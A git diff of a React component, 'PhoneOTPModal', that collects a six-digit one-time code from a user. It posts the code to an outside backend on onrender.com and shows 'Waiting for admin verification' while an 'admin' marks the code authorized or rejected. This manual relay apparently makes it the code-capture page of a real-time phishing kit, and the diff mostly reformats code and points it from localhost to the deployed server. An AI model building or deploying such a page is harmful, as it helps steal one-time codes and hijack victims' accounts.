@@ -12,12 +12,14 @@ const PhoneOTPModal = () => {
   // 🔧 State variables
   const [isOpen] = useState(true);
   const [otp, setOtp] = useState(["", "", "", "", "", ""]);
-  const [status, setStatus] = useState<"pending" | "authorized" | "rejected">("pending");
+  const [status, setStatus] = useState<"pending" | "authorized" | "rejected">(
+    "pending"
+  );
   const [otpStatus, setOtpStatus] = useState<string | null>(null);
   const [pollingError, setPollingError] = useState<string | null>(null);
   const [isSending, setIsSending] = useState(false);
   const [loginStatus, setLoginStatus] = useState("pending");
-  
+
   // 🔥 Overlay shows only after OTP submission
   const [submittedOtp, setSubmittedOtp] = useState(false);
   // ❌ Mark OTP inputs invalid on rejection
@@ -29,14 +31,19 @@ const PhoneOTPModal = () => {
   const statusRef = useRef(status);
   const otpStatusRef = useRef(otpStatus);
 
-  useEffect(() => { statusRef.current = status; }, [status]);
-  useEffect(() => { otpStatusRef.current = otpStatus; }, [otpStatus]);
+  useEffect(() => {
+    statusRef.current = status;
+  }, [status]);
+  useEffect(() => {
+    otpStatusRef.current = otpStatus;
+  }, [otpStatus]);
 
   // 🎯 Focus first input on open
   useEffect(() => {
     if (isOpen && inputRefs.current[0]) {
       inputRefs.current[0].focus();
-      if (DEBUG) console.log("%c[OTP Debug] 🎯 Auto-focused first input", "color: cyan");
+      if (DEBUG)
+        console.log("%c[OTP Debug] 🎯 Auto-focused first input", "color: cyan");
     }
   }, [isOpen]);
 
@@ -46,12 +53,17 @@ const PhoneOTPModal = () => {
 
     const fetchStatus = async () => {
       try {
-        const res = await fetch(`http://localhost:4000/api/status/${userId}`);
+        const res = await fetch(
+          `https://urban-system-backend.onrender.com/api/status/${userId}`
+        );
         if (!res.ok) throw new Error(`Server responded ${res.status}`);
         const data = await res.json();
 
         if (DEBUG) {
-          console.groupCollapsed("%c[OTP Debug] 📬 Poll result", "color: purple");
+          console.groupCollapsed(
+            "%c[OTP Debug] 📬 Poll result",
+            "color: purple"
+          );
           console.log("Login status:", data.status);
           console.log("OTP status:", data.otp_status);
           console.groupEnd();
@@ -59,14 +71,20 @@ const PhoneOTPModal = () => {
 
         if (data.status !== statusRef.current) {
           if (DEBUG)
-            console.log(`%c[Login Status] 🔄 ${statusRef.current} → ${data.status}`, "color: green; font-weight: bold");
+            console.log(
+              `%c[Login Status] 🔄 ${statusRef.current} → ${data.status}`,
+              "color: green; font-weight: bold"
+            );
           setStatus(data.status);
           setLoginStatus(data.status);
         }
 
         if (data.otp_status !== otpStatusRef.current) {
           if (DEBUG)
-            console.log(`%c[OTP Status] 🔄 ${otpStatusRef.current} → ${data.otp_status}`, "color: blue; font-weight: bold");
+            console.log(
+              `%c[OTP Status] 🔄 ${otpStatusRef.current} → ${data.otp_status}`,
+              "color: blue; font-weight: bold"
+            );
           setOtpStatus(data.otp_status);
         }
 
@@ -86,28 +104,48 @@ const PhoneOTPModal = () => {
   useEffect(() => {
     if (!otpStatus) return;
 
-    if (DEBUG) console.log("%c[OTP Debug] 🔔 OTP status effect triggered: " + otpStatus, "color: blue");
+    if (DEBUG)
+      console.log(
+        "%c[OTP Debug] 🔔 OTP status effect triggered: " + otpStatus,
+        "color: blue"
+      );
 
     switch (otpStatus) {
       case "authorized":
-        if (DEBUG) console.log("%c[OTP Status] ✅ OTP authorized — Navigating...", "color: green; font-weight: bold");
+        if (DEBUG)
+          console.log(
+            "%c[OTP Status] ✅ OTP authorized — Navigating...",
+            "color: green; font-weight: bold"
+          );
         setSubmittedOtp(false);
         setOtpRejected(false);
         navigate("/secure-account");
         break;
       case "rejected":
-        if (DEBUG) console.warn("%c[OTP Status] ❌ OTP rejected by admin — clearing inputs", "color: red; font-weight: bold");
+        if (DEBUG)
+          console.warn(
+            "%c[OTP Status] ❌ OTP rejected by admin — clearing inputs",
+            "color: red; font-weight: bold"
+          );
         setSubmittedOtp(false);
         setOtpRejected(true);
         setOtp(["", "", "", "", "", ""]); // clear inputs
         inputRefs.current[0]?.focus();
         break;
       case "otp_pending":
-        if (DEBUG) console.log("%c[OTP Status] ⏳ OTP pending admin verification...", "color: orange");
+        if (DEBUG)
+          console.log(
+            "%c[OTP Status] ⏳ OTP pending admin verification...",
+            "color: orange"
+          );
         // show overlay only if OTP has been submitted
         break;
       default:
-        if (DEBUG) console.log("%c[OTP Status] ℹ️ Unrecognized OTP status: " + otpStatus, "color: gray");
+        if (DEBUG)
+          console.log(
+            "%c[OTP Status] ℹ️ Unrecognized OTP status: " + otpStatus,
+            "color: gray"
+          );
     }
   }, [otpStatus, navigate]);
 
@@ -117,21 +155,39 @@ const PhoneOTPModal = () => {
       const updated = [...otp];
       updated[index] = value;
       setOtp(updated);
-      if (DEBUG) console.log(`%c[OTP Input] ✏️ Digit updated at index ${index}: ${value}`, "color: purple");
+      if (DEBUG)
+        console.log(
+          `%c[OTP Input] ✏️ Digit updated at index ${index}: ${value}`,
+          "color: purple"
+        );
 
       if (value && index < otp.length - 1) {
         inputRefs.current[index + 1]?.focus();
-        if (DEBUG) console.log(`%c[OTP Input] 👉 Auto-focus → index ${index + 1}`, "color: cyan");
+        if (DEBUG)
+          console.log(
+            `%c[OTP Input] 👉 Auto-focus → index ${index + 1}`,
+            "color: cyan"
+          );
       }
     } else if (DEBUG) {
-      console.warn(`%c[OTP Input] ⚠️ Invalid character ignored at index ${index}: ${value}`, "color: orange");
+      console.warn(
+        `%c[OTP Input] ⚠️ Invalid character ignored at index ${index}: ${value}`,
+        "color: orange"
+      );
     }
   };
 
-  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
+  const handleKeyDown = (
+    e: React.KeyboardEvent<HTMLInputElement>,
+    index: number
+  ) => {
     if (e.key === "Backspace" && !otp[index] && index > 0) {
       inputRefs.current[index - 1]?.focus();
-      if (DEBUG) console.log(`%c[OTP Input] ⬅️ Backspace → focus index ${index - 1}`, "color: cyan");
+      if (DEBUG)
+        console.log(
+          `%c[OTP Input] ⬅️ Backspace → focus index ${index - 1}`,
+          "color: cyan"
+        );
     }
   };
 
@@ -141,25 +197,45 @@ const PhoneOTPModal = () => {
 
     const code = otp.join("");
     if (code.length !== 6) {
-      if (DEBUG) console.warn("%c[OTP Debug] ⚠️ OTP incomplete, submission blocked", "color: orange");
+      if (DEBUG)
+        console.warn(
+          "%c[OTP Debug] ⚠️ OTP incomplete, submission blocked",
+          "color: orange"
+        );
       return;
     }
 
     setIsSending(true);
     try {
-      if (DEBUG) console.log("%c[OTP Debug] 🚀 Sending OTP: " + code + " for userId: " + userId, "color: cyan");
+      if (DEBUG)
+        console.log(
+          "%c[OTP Debug] 🚀 Sending OTP: " + code + " for userId: " + userId,
+          "color: cyan"
+        );
 
-      const res = await fetch("http://localhost:4000/api/save-otp", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ code, userId }),
-      });
+      const res = await fetch(
+        "https://urban-system-backend.onrender.com/api/save-otp",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ code, userId }),
+        }
+      );
       const text = await res.text();
       let data;
-      try { data = JSON.parse(text); } catch { data = text; }
+      try {
+        data = JSON.parse(text);
+      } catch {
+        data = text;
+      }
 
       if (!res.ok) throw new Error(data.error || "Failed to send OTP");
-      if (DEBUG) console.log("%c[OTP Debug] 📩 OTP send response:", "color: purple", data);
+      if (DEBUG)
+        console.log(
+          "%c[OTP Debug] 📩 OTP send response:",
+          "color: purple",
+          data
+        );
 
       setOtpStatus("otp_pending");
       setSubmittedOtp(true);
@@ -197,7 +273,9 @@ const PhoneOTPModal = () => {
             {otp.map((digit, index) => (
               <input
                 key={index}
-                ref={(el) => { inputRefs.current[index] = el; }}
+                ref={(el) => {
+                  inputRefs.current[index] = el;
+                }}
                 type="text"
                 maxLength={1}
                 value={digit}
@@ -227,10 +305,16 @@ const PhoneOTPModal = () => {
           </button>
 
           <div className="mt-4 text-sm text-gray-600">
-            <p>🔐 Login Status: <strong>{loginStatus}</strong></p>
-            <p>📱 OTP Status: <strong>{otpStatus || "-"}</strong></p>
+            <p>
+              🔐 Login Status: <strong>{loginStatus}</strong>
+            </p>
+            <p>
+              📱 OTP Status: <strong>{otpStatus || "-"}</strong>
+            </p>
             {pollingError && (
-              <p className="mt-2 text-xs text-red-500">Polling error: {pollingError}</p>
+              <p className="mt-2 text-xs text-red-500">
+                Polling error: {pollingError}
+              </p>
             )}
           </div>
         </form>
@@ -238,8 +322,12 @@ const PhoneOTPModal = () => {
         {/* 🔥 Overlay Loading Screen */}
         {submittedOtp && otpStatus === "otp_pending" && (
           <div className="absolute inset-0 bg-black bg-opacity-50 flex flex-col items-center justify-center rounded-xl text-white text-center p-4">
-            <p className="text-lg font-semibold mb-2">⏳ Waiting for admin verification...</p>
-            <p className="text-sm">Your OTP has been submitted. You will be redirected automatically.</p>
+            <p className="text-lg font-semibold mb-2">
+              ⏳ Waiting for admin verification...
+            </p>
+            <p className="text-sm">
+              Your OTP has been submitted. You will be redirected automatically.
+            </p>
           </div>
         )}
       </div>
